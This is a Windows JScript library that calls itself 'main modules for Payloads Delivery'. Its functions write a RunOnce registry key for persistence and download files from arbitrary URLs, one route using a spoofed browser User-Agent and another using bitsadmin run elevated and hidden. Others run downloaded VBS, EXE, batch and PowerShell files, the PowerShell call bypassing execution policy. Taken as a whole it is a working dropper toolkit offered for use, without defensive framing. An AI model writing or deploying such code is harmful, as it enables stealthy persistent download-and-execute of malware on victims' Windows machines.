/******************************************************************************
*
* LIB_FUNC.JS
* This file contain main modules for Payloads Delivery
*
* Revision 1.0.0.2 (Base Release). Must be always present!
*
******************************************************************************/


/***********************************************************
'
' CheckIfFileOrFolderExist
'
' The Script Checks If Folder or File on it is present
'
' PARAMETERS:	strFile - a checcking file
'		strFolder - a full path to checking folder
' RETURNS:	0 if File and Folder are Present
'		1 if Folder not File is Present
'		2 if File or Folder areh'n Present
' *********************************************************/
function CheckIfFileOrFolderExist( strFile, strFolder ) {
	var fso, strFullName;
	fso = new ActiveXObject("Scripting.FileSystemObject");
	if(fso.FolderExists(strFolder))	{
		if( strFile === "" ){
			return 1;
		}
		else {
			strFullName = strFolder + "\\" + strFile;
			if( fso.FileExists( strFullName ) ) {
				return 0;
			}
			else {
				return 1;
			}
		}
	}
	else {
		return 2;
	}
}

/******************************************************************************
'
' CreateRunOnceKey( strPath, strBatCmd )
' This Function Creates a strBatCmd Key at the Registry Node
' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
' with Value "wscript.exe //B //Nologo  " & strPath & "\" & strBatCmd
' After overload it is run this command
' The Script No Run at Elevated Mode. Further the Rights can be Elevated.
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Script File with instructions
'               (Windows Script Shell)
'
' RETURNS:      0 -- if Success
'               1 -- on Error takes place
'*****************************************************************************/

function CreateRunOnceKey(strPath, strBatCmd){
    // Define Variables
    var constRunOnce;
    var constRunBat;
    var strValue, strKey, wshShell;
    // Define RunOnce Constant
    constRunOnce = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
    // Define  Run Windows Shell Script Constant
    constRunBat = "wscript.exe //B //Nologo ";
    // Define "WScript.Shell" ActiveX Object for main matipulations 
    wshShell = new ActiveXObject("WScript.Shell");
    // String Manipulations
    strKey = constRunOnce + "\\" + strBatCmd;
    strValue = constRunBat + "\"" + strPath + "\\" + strBatCmd + "\"";
    // Write Registry Key
    wshShell.RegWrite(strKey, strValue, "REG_SZ");
    return 0;
}

/*****************************************************************************
'
' CreatedRunOnceKey( strPath, strBatCmd )
' This Subroutine checks if Function CreateRunOnceKey Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Command File with instructions
'               (Windows Command Shell)
'
' RETURNS:      NONE
'
******************************************************************************/
function CreatedRunOnceKey(strPath, strBatCmd){
    var strSuccess;
    var strFail;
    // Define Message Strings
    strSuccess = "The key " + strBatCmd + " at RunOnce Registry section was Created\n";
    strFail = "The key " + strBatCmd + " at RunOnce Registry section was NOT Created\n";
    // Run The Function
    if( !CreateRunOnceKey(strPath, strBatCmd) )
	WScript.Echo( strSuccess );
    else
	WScript.Echo( strFail );
 }

/******************************************************************************
'
' CreateTwocascadeFolders( strDisk, strFolder1, strFolder2 )
'
' This Function Creates on Disk strDisk the Folders strFolder1 and strFolder2
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      true if Success Create or Folder Exist
'               false if Cascade Can't Create
'
******************************************************************************/

function CreateTwocascadeFolders(strDisk, strFolder1, strFolder2){
    var fso;
    var strPath;
    var fsoCreateResult;
    var blnEnableCreated;
    var blnDrv;
    // Set Disk Letter to UPPERCASE
    strDisk = strDisk.toUpperCase();
    // Temporary Boolean Variable
    blnEnableCreated = true;
    // Define ActiveX File System Object
    fso = new ActiveXObject("Scripting.FileSystemObject");
    blnDrv = fso.DriveExists(fso.GetDriveName(strDisk));
    // Check if Drive Exist in System
    if( blnEnableCreated & blnDrv)
        blnEnableCreated = true;
    else
        blnEnableCreated = false;
    strPath = strDisk + "\\" + strFolder1
    // Check if strDisk\strFolder1 Path is exist
    if( blnEnableCreated & !fso.FolderExists(strPath))
    {
        // if not Attempt to Create Folder
        fsoCreateResult = fso.CreateFolder(strPath);
        if( fsoCreateResult != null )
	// Folder Created
            blnEnableCreated = true;
        else
            blnEnableCreated = false;
    }
    strPath = strPath + "\\" + strFolder2;
    // Check if strDisk\strFolder1\strFolder2 Path is Exist
    if( blnEnableCreated & !fso.FolderExists(strPath) )
    {
        // if not Attempt to Create Folder
        fsoCreateResult = fso.CreateFolder(strPath);
        if( fsoCreateResult != null )
	// Folder Created
            blnEnableCreated = true;
        else
            blnEnableCreated = false;
    }
    return blnEnableCreated;
}

/******************************************************************************
'
' CreatedCascade strDisk, strFolder1, strFolder2
'
' This Subroutine Creates Cascade of Folders and Says Operator about a Result
' of the Function CreateTwocascadeFolders Called
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      NONE
'
******************************************************************************/
function CreatedCascade(strDisk, strFolder1, strFolder2){
    var strSuccess, strFail;
    // Define Messages 
    strSuccess = "The Folders Cascade has created or Exist\n";
    strFail = "Fail to Create Cascade on Error\n";
    // Run Functions
    if( CreateTwocascadeFolders(strDisk, strFolder1, strFolder2) )
	WScript.Echo( strSuccess );
    else
	WScript.Echo( strFail );
}

/******************************************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- If HTTP Response Not 200 (while is not make)
'
******************************************************************************/

function UploadFilesFromInt(strFile, strURL, strPath){
    var fso, xmlHttp, adoStream;
    // Define FileSystemObject
    fso = new ActiveXObject("Scripting.FileSystemObject");
    // Define XMLHTTP Help Object
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    // Define Adodb.Stream" Object
    adoStream = new ActiveXObject("Adodb.Stream");
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    // Define Full Downloaded File URL
    strFileURL = strURL + strFile;
    // Define Full Local Path to be Downloaded
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    // Open URL (Get Requiest)
    xmlHttp.Open( "GET", strFileURL, false );
    // Set User-Agent Header (for Safari Browser)
    xmlHttp.SetRequestHeader( "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
    // Send File from URL
    xmlHttp.Send();
    if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
    // If Send Request is Successful 
        blnExistRemoteFile = true;
    else
    {
        blnExistRemoteFile = false;
        intUploadFilesFromInt = 2;
        xmlHttp.Abort();
    }
    if( blnExistRemoteFile )
    {
        // Set AdoStream Type mode and Open It
        adoStream.Type = 1;
        adoStream.Mode = 3;
        adoStream.Open();
        // Write to AdoStream Response Body jf HTTP Request
        adoStream.Write(xmlHttp.responseBody);
        // Save Stream to File
        adoStream.SaveToFile( strLocal_Path, 2 );
	// /Downloaded File
	
	// Close Objects	
	adoStream.Close();
	xmlHttp.Abort();
	
	// Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
	// /Check if File Downloaded
    }
    return intUploadFilesFromInt;
}

/******************************************************************************
'
' UploadFilesFromInt01( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses "BitsAdmin.exe" Function for Load File
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'				intTimeOut -- estimated Time for Download (ms)
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'
******************************************************************************/

function UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
{
    var fso, wshShell, shApp;
    // Define ActiveX Objects
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wshShell = new ActiveXObject("WScript.Shell");
    shApp = new ActiveXObject("Shell.Application");
    // Define Variables
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    // String Manipulations
    strFileURL = strURL + strFile;
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    var envVarProccess;
    var pathCmd, strSysPath, strParam;
    // Set Current Environment Variables Settings
    envVarProccess = wshShell.Environment("PROCESS");
    // Set Path to Command Shell %SystemRoot%\System32\
	
    pathCMD = envVarProccess("SystemRoot") + "\\System32\\";
    // Set bitsadmin.exe Full Path Name
    strSysPath = pathCMD + "bitsadmin.exe";
    // Set Parameters for bitsadmin Program
    strParam = "/Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND " + strFileURL + " \"" + strLocal_Path + "\""
    // Run Bitsadmin witn Elevated Privileges (runas) at Invisible Mode (0)
    shApp.ShellExecute( strSysPath, strParam, pathCMD, "runas", 0 );
    // /Downloaded File
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep( intTimeOut );
		
    // Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
    // /Check if File Downloaded
    return intUploadFilesFromInt;
}

/******************************************************************************
'
' SUBROUTENE UploadedFilesFromInt( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt( strFile, strURL, strPath ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
******************************************************************************/

function UploadedFilesFromInt(strFile, strURL, strPath){
    var strSuccess, strFail, strURLFail, iResult;
    strSuccess = "The File " + strFile + " was Successfully Downlodaded\nFrom URL: " + strURL + "\nTo Path: " + strPath + "\n";
    strFail = "Error to Create File: " + strFile + " on Path " + strPath + "\n";
    strURLFail = "The URL: " + strURL + strFile + " is not valid!\n";
    iResult = UploadFilesFromInt(strFile, strURL, strPath);
    switch( iResult )
    {
        case 0:
            WScript.Echo( strSuccess );
			break;
        case 1:
            WScript.Echo( strFail );
			break;
        case 2:
            WScript.Echo( strURLFail );
			break;
    }
}

/******************************************************************************
'
' SUBROUTENE UploadedFilesFromInt01( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt01( strFile, strURL, strPath intTimeOut ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
******************************************************************************/

function UploadedFilesFromInt01(strFile, strURL, strPath, intTimeOut){
    var strSuccess, strFail, strURLFail, iResult;
    strSuccess = "The File " + strFile + " was Successfully Downlodaded\nFrom URL: " + strURL + "\nTo Path: " + strPath + "\n";
    strFail = "Error to Create File: " + strFile + " on Path " + strPath + "\n";
    strURLFail = "The URL: " + strURL + strFile + " is not valid!\n";
    iResult = UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
    switch( iResult )
    {
	case 0:
        WScript.Echo( strSuccess );
	    break;
	case 1:
		WScript.Echo( strFail );
		break;
    }
}

function DoNothing(){
	return;
}

/******************************************************************************
'
' RunDownloadedScript( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedScript(strPath, strVBS, intTimeOut ){
    var constRun_VBS, constOpt;
    // Define Windows Scripts Options
    constRun_VBS = "//Nologo ";
    // Define VBS Script Options (Empty)
    constOpt = "";
    var strValue, shApp, fso, wsh, envProc, pathCMD;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Check Paths
    if (!fso.FileExists(pathCMD + "\\cscript.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strVBS)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/******************************************************************************
'
' RunedDownloadedScript( strPath, strVBS, intTimeOut )
' This Subroutine checks if Function RunDownloadedScript Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunedDownloadedScript(strPath, strVBS, intTimeOut){
    var strSuccess;
    strSuccess = "The Script " + strVBS + " was Run with Success\n";
    RunDownloadedScript(strPath, strVBS, intTimeOut );
    WScript.Echo( strSuccess );
}

/***
 *
 * getRegistry.js
 * The Script Contains a Function to Manipulate by
 * a Registry in JScript Files
 *
**/

/***
 *
 * regKeyExists
 * This Function Tests if key exist in Registry
 *
 * @param 	key 	- Tested key in Registry
 * @return 	true if registry key exists
 *
 **/
 function regKeyExists ( key ) {
     var wshShell;
	// Define Temporary Variable (Value of the Key)
	var key2;
	try{
		wshShell = new ActiveXObject("WScript.Shell");
		key2 = wshShell.RegRead(key);
	}
	catch( err )
	{
		return false;
	}
	return true;
}

/***
 *
 * testRegKeyExists
 * This Function Tests if key exist in Registry
 *
 * @param 	key 	- Tested key in Registry
 * @return 	NONE
 *
 **/
 function testRegKeyExists ( key ) {
     var value, wshShell;
     
     if( regKeyExists( key ) ) {
		// Type if Registry Key is Exist
		WScript.Echo( "Registry key: " + key + " is exists.");
		wshShell = new ActiveXObject("WScript.Shell");
		value  = wshShell.RegRead(key);
		if( value === "" || value === 0 ) {
			// Type if Value of the key does not Set or Empty
			WScript.Echo( "Warning! Value of the Key not Set.");
		}
		else {
			// Type a Value of the Key
			WScript.Echo( "Value of the Key: " + value );
		}
	}
	else {
		WScript.Echo( "Wrong Registry key: " + key  );
	}
}
/***
 *
 * envProcExists
 * This Function Tests if Environment Variable exists
 *
 * @param 	key 	- Tested key at Environment
 * @return 	true if registry key exists
 *
 **/
function envProcExists ( key ) {
	var wshShell, wshEcvirProc;
	var key2;
	try{
		wshShell = new ActiveXObject("WScript.Shell");
		wshEcvirProc = wshShell.Environment("PROCESS");
		key2 = wshEcvirProc( key );
		if( key2 === "" ) return false;
	}
	catch( err )
	{
		return false;
	}
	return true;
}

/***
 *
 * testEnvProcExists
 * This Function Tests if Environment Variable exists
 *
 * @param 	key 	- Tested key at Environment
 * @return 	NONE
 *
 **/
function testEnvProcExists ( key ) {
	var value, wshShell, wshEcvirPro;
	if( envProcExists( key ) ) {
		WScript.Echo( "Environment variable: " + key + " is exists.");
		wshShell = new ActiveXObject("WScript.Shell");
		wshEcvirProc = wshShell.Environment("PROCESS");
		value = wshEcvirProc( key );
		if( value === "" ) {
			WScript.Echo( "Warning! Value of the Variable not Set.");
		}
		else {
			WScript.Echo( "Value of the Variable: " + value );
		}
	}
	else {
		WScript.Echo( "Wrong Environment Variable: " + key  );
	}
}

/******************************************************************************
'
' testRunDownloadedScript( strPath, strVBS, intTimeOut )
' This Function Run a strVBS File
' with Command "wscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'               intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function testRunDownloadedScript(strPath, strVBS, intTimeOut ){
    var constRun_VBS, constOpt;
    var constRun_VBS = "//Nologo ";
    var constOpt = "";
    var strValue, shApp;
    shApp = new ActiveXObject("Shell.Application");
    strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
    shApp.ShellExecute( "C:\\WINDOWS\\System32\\wscript.exe", strValue, strPath, "runas", 1 );
//    setTimeout( DoNothing, intTimeOut );
    WScript.Sleep(intTimeOut);
}

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path For User Variable %TEMP% if Success
'               "C:\Windows\Temp" if API Error
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	// Define ActiveX Objects
	fso = new ActiveXObject( "Scripting.FileSystemObject" );
	wsh = new ActiveXObject( "WScript.Shell" );
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	
	var  envVariable;
	envVariable = envProc( "TEMP" );
	if(!fso.FolderExists( envVariable )){
		envVariable = envSys( "TMP" );
		if(!fso.FolderExists( envVariable )){
			envVariable = "";
		}
	}
	return envVariable;
}

/* *****************************************************************************
'
' Copy_File
' This Function Copy thread_VBS File from Current Directory to Local_Path
'
' PARAMETERS:   thread_VBS -- target file to copy
'               local_Path -- the path to be copied
'
' RETURNS:      0 if Success
'				1 if File not Copy
'
' *****************************************************************************/
function Copy_File( thread_VBS, local_Path ){
	// Define Variables
	var Current_File, Target_File, fso, objFile;
	fso = new ActiveXObject( "Scripting.FileSystemObject" );
	// Set Full Current File Path Name
	Current_File = fso.GetParentFolderName( WScript.ScriptFullName ) + "\\" + thread_VBS;
	// Set Full Target File Path Name
	Target_File = local_Path + "\\" + thread_VBS;
	if( !fso.FolderExists( local_Path ) ) return 1;
	if( fso.FileExists( Target_File ) ) {
		// If Target File is Exists Delete It
		objFile = fso.GetFile( Target_File );
		objFile.Delete();
		if(fso.FileExists( Target_File ) ) return 1;
	}
	if( fso.FileExists( Current_File ) ) {
		// If Current File Exists Copy It
		objFile = fso.GetFile( Current_File );
		objFile.Copy(Target_File);
		if(!fso.FileExists( Target_File ) ) 
			return 1;
		else 
			return 0;
	}
	else 
		return 1;
}

/* *****************************************************************************
'
' Copy_File_Temp
' This Function Copy thread_VBS File from Temporary Directory to Local_Path
'
' PARAMETERS:   thread_VBS -- target file to copy
'               local_Path -- the path to be copied
'
' RETURNS:      0 if Success
'				1 if File not Copy
'
' *****************************************************************************/
function Copy_File_Temp( thread_VBS, local_Path ){
	// Define Variables
	var Current_File, Target_File, fso, objFile, tempFolder;
	fso = new ActiveXObject( "Scripting.FileSystemObject" );
	// Set Full Current File Path Name
	tempFolder = getTempEnviron();
	if( tempFolder === "" ) return 1
	Current_File = tempFolder + "\\" + thread_VBS;
	// Set Full Target File Path Name
	Target_File = local_Path + "\\" + thread_VBS;
	if( !fso.FolderExists( local_Path ) ) return 1;
	if( fso.FileExists( Target_File ) ) {
		// If Target File is Exists Delete It
		objFile = fso.GetFile( Target_File );
		objFile.Delete();
		if(fso.FileExists( Target_File ) ) return 1;
	}
	if( fso.FileExists( Current_File ) ) {
		// If Current File Exists Copy It
		objFile = fso.GetFile( Current_File );
		objFile.Copy(Target_File);
		if(!fso.FileExists( Target_File ) ) 
			return 1;
		else 
			return 0;
	}
	else 
		return 1;
}

/******************************************************************************
'
' RunDownloadedExe( strPath, strVBS, iTimeOut )
' This Function Run a strVBS File
' with Command "strPath & "\" & strVBS "
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunDownloadedExe(strPath, strVBS, intTimeOut ){
    var constOpt;
    // Define Exe Options (Empty)
    constOpt = "";
    var strValue, shApp, fso;
    // Define ActiveX Object
    fso = new ActiveXObject("Scripting.FileSystemObject");
    shApp = new ActiveXObject("Shell.Application");
    // Set Exe Command Arguments
    strValue = strPath + "\\" + strVBS;
    if(!fso.FileExists(strValue)) return 1
    // Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( strValue, constOpt, strPath, "runas", 0 );
    // Run exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( strValue, constOpt, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/******************************************************************************
'
' RunDownloadedCmd( strPath, strCmd, iTimeOut )
' This Function Run a strCmd Command File File
' with Command cmd /c "strPath & "\" & strVBS "
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'	`			1 if Path Not Found
'
******************************************************************************/

function RunDownloadedCmd(strPath, strCmd, intTimeOut ){
    var constOpt;
    // Define Command Options (Empty)
    constOpt = "";
    var preArgs; 	// Previously Arguments of cmd.exe
    preArgs = "/c ";
    var strValue, shApp, wsh, envProc, pathCMD, fso;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    //Define Command Path Variable
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Set cmd.exe Command Arguments
    strValue = preArgs + "\"" + strPath + "\\" + strCmd + "\" " + constOpt;
    // Check If Path Exists
    if(!fso.FileExists(strPath + "\\" + strCmd )) return 1;
    if(!fso.FileExists(pathCMD + "\\cmd.exe")) return 1;
    // Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0 );
    // Run exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/******************************************************************************
'
' RunDownloadedPwsh( strPath, strPwsh, intTimeOut )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedPwsh(strPath, strPwsh, intTimeOut ){
    var constRun_Pwsh, constOpt;
    // Define Windows Scripts Options
    constRun_VBS = "-noprofile -ExecutionPolicy Bypass -command ";
    // Define VBS Script Options (Empty)
    constOpt = "";
    var strValue, shApp, fso, wsh, envProc, pathPwsh;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathPwsh = envProc("SystemRoot") + "\\System32\\WindowsPowerShell\\v1.0";
    // Check Paths
    if (!fso.FileExists(pathPwsh + "\\PowerShell.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strPwsh)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_VBS +"\"" + strPath + "\\" + strPwsh + "\" " + constOpt;
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathPwsh + "\\PowerShell.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathPwsh + "\\PowerShell.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/* *********************************************************
'
' CheckIfVariableDefined
'
' This Function Checks if System Variable strVar
' is Defines in the System (PROCESS)
'
' PARAMETERS:    strVar;
' RETURN:        0 if Success
'                1 if "" (Empty)
'                2 if Not Defined
'
***********************************************************/

function CheckIfVariableDefined (strVar) {
    // body... 
    var wsh, envProc, strValue;
    // Define ActiveX Objects
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    try {
        // statements
        strValue = envProc( strVar );
        if (strValue == null ) {
            return 2;
        }
        else if (strValue === "" ) { 
            return 1;
        }
        else {
            return 0;
        }
    } catch(e) {
        // statements
        console.log(e);
        return 2;
    }
}

/* *********************************************************
'
' CheckIfFolderVariableDefined
'
' This Function Checks if System Variable strVar
' is Defines in the System (PROCESS) and it Points to
' Valid Folder'
'
' PARAMETERS:    strVar;
' RETURN:        0 if Success
'                1 if Folder Not Exist
'                2 if Not Defined
'
***********************************************************/

function CheckIfFolderVariableDefined (strVar) {
    // body... 
    var wsh, envProc, strValue, fso, iFlag;
    // Define ActiveX Objects
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    // Code
    iFlag = CheckIfVariableDefined (strVar);
    if (iFlag ==2 ) { 
        return iFlag;
    }
    else if (iFlag == 1) {
        return iFlag;
    }
    else if (iFlag == 0) {
        var strValue;
        strValue = envProc(strVar);
        if( fso.FolderExists(strValue)){
            return 0;
        }
        else {
            return 1;
        }
    }
    return 2;
}

